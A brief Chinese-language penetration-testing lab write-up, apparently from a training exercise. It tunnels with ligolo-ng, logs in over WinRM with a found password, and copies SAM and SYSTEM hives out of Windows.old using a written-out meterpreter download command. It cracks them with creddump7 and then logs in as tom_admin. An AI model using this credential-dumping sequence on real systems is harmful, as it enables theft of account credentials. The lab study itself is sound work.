## 用 ligolo-ng 建立 proxy tunnel
## nmap 
- <img width="1472" height="537" alt="image" src="https://github.com/user-attachments/assets/3f05836e-96b5-4dd0-9146-2d081e636632" />

## 5985 port
- 成功在 .141 發現 celia.almeda 的密碼，並成功登入
  - <img width="1918" height="312" alt="image" src="https://github.com/user-attachments/assets/e23c33b9-39b1-4544-926b-44164ca327be" />
- 在 windows.old/windows/system32 發現 system 和 sam 
  - <img width="1918" height="682" alt="image" src="https://github.com/user-attachments/assets/9122252a-8b2a-48ef-b9df-09253bc402c2" />
- 用 msfconsole 取得 meterpreter 後，用 download 下來
  ```
  download C:\\Windows.old\\Windows\\System32\\SAM /home/kali/Desktop/
  ```
- 用 creddump7 解 system 和 sam
  - <img width="1918" height="630" alt="image" src="https://github.com/user-attachments/assets/f31ed633-7c9d-45d2-9e69-c82be3f1c6f8" />
- 成功用 tom_admin 登入
  - <img width="1918" height="292" alt="image" src="https://github.com/user-attachments/assets/55531758-21d2-47f9-bd94-05b1f3337c58" />














































